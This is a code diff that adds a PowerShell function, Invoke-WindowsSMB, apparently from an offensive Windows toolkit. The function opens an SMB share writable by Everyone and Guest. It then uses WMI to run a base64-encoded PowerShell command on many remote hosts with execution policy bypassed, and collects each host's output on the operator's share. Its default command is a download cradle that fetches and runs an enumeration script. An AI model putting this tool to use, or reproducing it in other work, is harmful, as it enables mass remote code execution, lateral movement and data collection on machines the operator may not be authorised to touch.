@@ -1690,6 +1690,85 @@ function Get-DomainCertificates{
         }
     }
 }
+function Invoke-WindowsSMB {
+    <#
+    Modified invoke-masscommand.ps1
+
+        .SYNOPSIS
+        Uses WMI and a local web server to mass-run a command
+        across multiple machines.
+
+        .PARAMETER Hosts
+        Array of host names to run Invoke-MassCommand on.
+
+        .PARAMETER HostList
+        List of host names to run Invoke-MassCommand on.
+
+        .PARAMETER Command
+        PowerShell one-liner command to run.
+
+        .PARAMETER SMBFolder
+        Folder to pipe host outputs to.
+
+        .PARAMETER FQDN
+        FQDN for your machine
+    #>
+    [cmdletbinding()]
+    param(
+        [Parameter(Position=0,ValueFromPipeline=$true)]
+        [String[]]
+        $Hosts,
+
+        [String]
+        $HostList,
+
+        [Parameter(Mandatory=$true)]
+        [String]
+        $Command = "iex(new-object net.webclient).downloadstring('http://localhost/Invoke-WinEnum.ps1');invoke-winenum -extended",
+
+        [Parameter(Mandatory=$true)]
+        [String]
+        $SMBFolder="C:\smb",
+
+        [Parameter(Mandatory=$true)]
+        [string]
+        $FQDN
+    )
+    begin {
+        if($HostList){
+            if (Test-Path -Path $HostList){
+                $Hosts += Get-Content -Path $HostList
+            }
+            else {
+                Write-Output "[!] Input file doesn't exist!"
+                return
+            }
+        }
+        if(!(Test-Path $SMBFolder)){
+            Write-Output "[*]Creating smb folder"
+            New-Item -Force -ItemType directory -Path $SMBFolder | Out-Null
+        }
+        try{
+            Write-Output "[*]Creating smb share"
+            New-SmbShare -Path $SMBFolder -ChangeAccess 'Guest','Everyone' -name temp -ErrorAction stop
+        }catch{
+            throw
+        }
+        Write-Output "[*]Settings NTFS permissions"
+        icacls $SMBFolder /grant Guest:M
+        icacls $SMBFolder /grant Everyone:M
+    }
+
+    process {
+        foreach($_host in $hosts) {
+            $random = 1000..9999 | Get-Random
+            $_command = "$Command | out-file -encoding ascii -FilePath  \\$FQDN\temp\$_host-$random"
+            Write-Output "[*]Executing $_command on $_host"
+            $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($_Command))
+            Invoke-WmiMethod -ComputerName $_host -Path Win32_process -Name create -ArgumentList "powershell.exe -exe bypass -nop -enc $encodedCommand" | out-null
+        }
+    }
+}
 function Invoke-WindowsWMI{
     <#
     .SYNOPSIS
